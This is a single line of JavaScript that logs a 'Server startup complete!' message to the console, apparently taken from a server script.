console.log('✅ Server startup complete!');
